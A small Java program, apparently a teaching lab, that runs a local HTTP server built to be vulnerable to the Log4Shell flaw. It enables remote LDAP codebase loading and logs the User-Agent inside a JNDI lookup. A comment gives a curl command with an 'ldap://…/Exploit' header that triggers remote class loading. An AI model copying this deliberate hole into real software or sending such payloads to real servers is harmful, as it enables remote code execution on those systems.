package de.nordakademie;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.List;

public class Main {

    private static final Logger logger = LogManager.getLogger(Main.class);

    public static void main(String[] args) throws IOException {
        final int PORT = 8080;
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        HttpServer server =
                HttpServer.create(new InetSocketAddress("127.0.0.1", PORT), 0);
        server.createContext("/", new RequestHandler());
        server.start();
        System.out.println("Server is running on port " + PORT);
    }

    static class RequestHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String response =
                    "I'm using a vulnerable version of log4J, enjoy!";
            // curl http://localhost:8080 --user-agent "ldap://127.0.0.1:1389/Exploit"
            // Das dann mit log4j und Jindi loggen
            List<String> userAgent = (List<String>) exchange.getRequestHeaders()
                    .get("User-Agent");
            logger.error(String.format("${jndi:%s}", userAgent.get(0)));
            //logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
            exchange.sendResponseHeaders(200, response.length());
            OutputStream os = exchange.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }
}

